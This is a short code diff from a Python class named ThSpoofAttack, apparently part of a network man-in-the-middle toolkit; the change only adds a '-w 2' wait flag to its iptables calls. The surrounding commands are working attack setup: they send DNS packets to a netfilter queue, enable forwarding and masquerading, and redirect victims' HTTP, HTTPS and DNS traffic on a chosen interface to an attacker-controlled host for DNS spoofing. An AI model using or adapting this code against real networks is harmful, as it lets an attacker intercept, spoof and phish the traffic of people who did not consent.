@@ -197,13 +197,13 @@ class ThSpoofAttack(QThread):
                 pass
 
     def setIptables(self,option=str()):
-        system('iptables -t nat -{} PREROUTING -p udp --dport 53 -j NFQUEUE'.format(option))
-        system('iptables -{} FORWARD --in-interface {} --jump ACCEPT'.format(option,self.interface))
-        system('iptables -t nat -{} POSTROUTING --out-interface {} --jump MASQUERADE'.format(option,self.interface))
-        system('iptables -t nat -{} PREROUTING -p tcp --dport 80 --jump DNAT --to-destination {}'.format(option,self.redirect))
-        system('iptables -t nat -{} PREROUTING -p tcp --dport 443 --jump DNAT --to-destination {}'.format(option,self.redirect))
-        system('iptables -t nat -{} PREROUTING -i {} -p udp --dport 53 -j DNAT --to {}'.format(option,self.interface,self.redirect))
-        system('iptables -t nat -{} PREROUTING -i {} -p tcp --dport 53 -j DNAT --to {}'.format(option,self.interface,self.redirect))
+        system('iptables -w 2 -t nat -{} PREROUTING -p udp --dport 53 -j NFQUEUE'.format(option))
+        system('iptables -w 2 -{} FORWARD --in-interface {} --jump ACCEPT'.format(option,self.interface))
+        system('iptables -w 2 -t nat -{} POSTROUTING --out-interface {} --jump MASQUERADE'.format(option,self.interface))
+        system('iptables -w 2 -t nat -{} PREROUTING -p tcp --dport 80 --jump DNAT --to-destination {}'.format(option,self.redirect))
+        system('iptables -w 2 -t nat -{} PREROUTING -p tcp --dport 443 --jump DNAT --to-destination {}'.format(option,self.redirect))
+        system('iptables -w 2 -t nat -{} PREROUTING -i {} -p udp --dport 53 -j DNAT --to {}'.format(option,self.interface,self.redirect))
+        system('iptables -w 2 -t nat -{} PREROUTING -i {} -p tcp --dport 53 -j DNAT --to {}'.format(option,self.interface,self.redirect))
 
     def stop(self):
         print('Stop Thread:' + self.objectName())
